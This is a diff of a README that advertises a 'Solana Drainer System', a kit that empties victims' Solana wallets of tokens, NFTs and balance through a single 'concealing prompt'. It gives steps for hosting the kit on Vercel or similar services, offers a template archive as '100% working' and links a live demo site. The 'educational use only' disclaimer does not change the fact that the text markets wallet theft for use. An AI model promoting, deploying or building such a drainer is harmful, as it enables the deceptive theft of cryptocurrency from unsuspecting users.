@@ -2,7 +2,7 @@
  ‼️‼️ This files is dedicated to WEB3.0 learning, protection and Legal Penetration Testing. All information on this files is for educational use only ‼️‼️
 #########################################################################################################
 
-💯 Solana Drainer System 💯
+# 💯 Solana Drainer System 💯
 
 Provides a fast and easy way to drain user's entire Solana wallets (Phantom, Solflare, Trust Wallet, Coinbase Wallet) - including tokens, NFTs and Solana balance in 1 concealing prompt 👀
 
@@ -26,9 +26,9 @@ All is setup your drainer is ready to go.
 Upload your website on Vercel or any Hosting
 
 
-WE PROVIDE A CUSTOM DEMO WEBSITE 100% WORKING ALSO NAMED : solanadrainertemplate.rar
+# WE PROVIDE A CUSTOM DEMO WEBSITE 100% WORKING ALSO NAMED : solanadrainertemplate.rar
 
-DEMO WEBSITE : https://soilverse.vercel.app
+# DEMO WEBSITE : https://soilverse.vercel.app
 
 #SOLANA #PHANTOM #NFT #SEAPORT #DRAINERTESTING #BITCOIN #BNB #ETH
 
